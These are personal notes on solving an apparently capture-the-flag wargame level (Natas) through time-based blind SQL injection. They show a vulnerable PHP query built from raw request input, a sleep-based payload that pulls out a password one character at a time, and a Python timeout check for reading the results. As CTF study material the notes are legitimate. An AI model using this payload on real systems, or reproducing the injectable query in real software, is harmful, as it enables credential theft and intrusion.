mysql conditional time delay
SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') 

query per page source
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 

translated to sql:
SELECT * from users where username="[paylaod goes here]

so we want our paylod to look like this:
SELECT * from users where username="natas18" and if(ascii(substr(password,{},1))={},sleep(10),'a')
which should theoretically add a 10s delay if the character in the password matches

next we need to filter our True condition in python to check for the response time:
if it's 10s then it's true, otherwise it's false
this should greatly speed up our querying since there will be a lot more falses than trues.

in this case, we need to use try/except because if python requests times out, it throws an error.
syntax looks like this:
try: 
    r = requests.post(url+payload, headers=headers, timeout=5)
except requests.exceptions.ReadTimeout:
    print(chr(i), end='', flush=True)
    break

note that the exception is defined as 'requests.exceptions.ReadTimeout'
    i sent a test request, and this was the error that was thrown.
    we want to specify this because if there are any other errors, we want to know about them.
